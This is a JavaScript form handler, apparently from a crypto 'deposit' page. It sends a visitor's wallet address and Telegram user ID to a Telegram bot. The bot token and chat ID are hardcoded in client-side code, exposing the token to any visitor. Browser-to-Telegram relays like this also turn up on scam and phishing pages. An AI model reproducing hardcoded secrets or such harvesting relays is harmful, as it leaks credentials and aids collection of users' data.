document.getElementById('depositBtn').addEventListener('click', async () => {
  let button = document.getElementById('depositBtn');

  const walletAddress = document
    .querySelector('#walletAddressInput')
    .value.trim();
  const telegramUserId = document
    .querySelector('#telegramUserInput')
    .value.trim();

  if (!walletAddress || !telegramUserId) {
    alert('Please fill in both fields.');
    return;
  }

  const botToken = '7107034391:AAHqyRFDjFCgBazgswzY_CRAYdtlgMQO-N4';
  const chatId = '5204205237';

  const message = `
<b>✨ New Submission:</b>
<i><b>Wallet Address:</b></i> <code>${walletAddress}</code>
<i><b>Telegram UserId:</b></i> <code>${telegramUserId}</code>
`;
  try {
    button.innerHTML = 'Submiting...';
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
        }),
      },
    );

    const result = await response.json();

    if (result.ok) {
      alert('Details sent successfully!');
      button.innerHTML = 'Submit';
    } else {
      alert('Failed to send the message. Check the bot token and chat ID.');
      button.innerHTML = 'Submit';
    }
  } catch (error) {
    console.error('Error sending message:', error);
    alert('An error occurred. Please try again.');
  }
});
